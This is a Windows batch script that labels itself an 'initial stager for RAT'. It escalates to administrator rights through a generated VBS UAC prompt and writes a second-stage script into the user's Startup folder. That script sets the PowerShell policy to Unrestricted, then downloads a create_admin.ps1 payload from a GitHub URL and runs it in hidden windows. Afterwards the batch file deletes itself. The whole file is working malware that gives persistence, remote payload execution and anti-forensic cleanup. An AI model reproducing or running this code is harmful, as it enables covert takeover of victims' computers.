@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:-------------------------------------- 

@REM initial stager for RAT

@REM Variables
set "STARTUP_PATH=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
set "INITIAL_PATH=%cd%"
set "THIS_FILE_NAME=initial.cmd"

@REM change the dir
cd %STARTUP_PATH%

@REM write pyloads to startup
(   @REM write here needed link for the download the create_admin.ps1
    echo powershell -WindowStyle hidden -c "Set-ExecutionPolicy Unrestricted"
    echo powershell -WindowStyle hidden -c "Invoke-WebRequest -Uri 'raw.githubusercontent.com/st2l/lil-rat/refs/heads/master/create_admin.ps1' -OutFile '%STARTUP_PATH%/create_admin.ps1'"
    echo powershell -WindowStyle hidden "./create_admin.ps1"
)> stage2.cmd

@REM run a payload
powershell -WindowStyle hidden "./stage2.cmd"

@REM go back and delete ourselves
cd %INITIAL_PATH%
del %THIS_FILE_NAME%

